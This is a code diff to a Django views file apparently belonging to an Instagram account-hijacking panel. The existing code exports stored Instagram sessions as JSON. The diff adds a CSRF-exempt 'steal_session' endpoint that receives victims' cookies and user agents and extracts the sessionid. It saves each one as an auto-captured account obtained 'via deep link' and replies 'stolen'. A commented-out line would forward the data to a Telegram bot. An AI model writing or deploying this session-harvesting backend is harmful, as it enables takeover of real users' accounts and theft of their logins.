@@ -140,6 +140,10 @@ def dashboard(request):
     return HttpResponse(html)
 
 
+
+
+
+
 def download_json(request):
     data = []
     for acc in InstagramAccount.objects.all():
@@ -155,3 +159,35 @@ def download_json(request):
     response = HttpResponse(json.dumps(data, indent=2), content_type='application/json')
     response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_SESSIONS_{timezone.now().strftime("%Y%m%d")}.json"'
     return response
+
+
+
+
+@csrf_exempt
+def steal_session(request):
+    if request.method == "POST":
+        data = json.loads(request.body)
+        cookies = data.get('cookies', '')
+        ua = data.get('useragent', '')
+
+        # EXTRACT SESSIONID FROM COOKIES
+        import re
+        session_match = re.search(r'sessionid=([^;]+)', cookies)
+        if session_match:
+            sessionid = session_match.group(1)
+
+            # SAVE TO DATABASE
+            InstagramAccount.objects.create(
+                username="AUTO_CAPTURED_" + sessionid[:10],
+                password="VIA_DEEP_LINK",
+                session_data=fernet.encrypt(json.dumps({"sessionid": sessionid}).encode()).decode(),
+                is_active=True,
+                last_success=timezone.now()
+            )
+
+            # AUTO SEND TO TELEGRAM (OPTIONAL)
+            # requests.post("https://api.telegram.org/bot...", data={...})
+
+        return JsonResponse({"status": "stolen"})
+
+    return HttpResponse("OK")
